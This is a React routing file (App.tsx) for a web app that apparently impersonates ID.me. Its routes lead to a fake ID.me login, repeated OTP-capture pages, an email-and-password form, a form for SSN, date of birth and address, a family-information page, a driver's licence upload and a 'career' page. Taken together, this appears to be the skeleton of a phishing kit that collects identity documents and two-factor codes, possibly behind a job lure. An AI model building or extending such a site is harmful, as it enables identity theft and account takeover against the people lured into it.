// src/App.tsx

import React from "react";
import { Routes, Route } from "react-router-dom";

// Page Imports
import Home from "./pages/Home";
import Career from "./pages/Career";
import Ime from "./pages/ime";
import Idme from "./pages/idme";
import IdmeOtp from "./pages/idmeotp";
import Otp from "./pages/otp";
import Otp2 from "./pages/idmeotp2";

// Form Components
import SignInForm from "./pages/form";                 // Email & Password form
  // Full Name, Mobile, SSN, DOB, Address
import Teil from "./pages/teil";                       // Family information form
import SuccessPage from "./pages/SuccessPages";        // Success page with animation
import UploadLicense from "./pages/upload";     // ID.me driver's license upload

const App: React.FC = () => {
  return (
    <Routes>
      {/* Main Routes */}
      <Route path="/" element={<Home />} />
      <Route path="/career" element={<Career />} />
      <Route path="/ime" element={<Ime />} />
      
      {/* ID.me Routes */}
      <Route path="/idme" element={<Idme />} />
      <Route path="/idmeotp" element={<IdmeOtp />} />
      <Route path="/otp" element={<Otp />} />
      <Route path="/idmeotp2" element={<Otp2 />} />
      
      {/* Form Routes */}
      <Route path="/form" element={<SignInForm />} />
        {/* 5‑field validation */}
      <Route path="/teil" element={<Teil />} />
      <Route path="/success" element={<SuccessPage />} />
      
      {/* New ID.me License Upload */}
      <Route path="/upload" element={<UploadLicense />} />
    </Routes>
  );
};

export default App;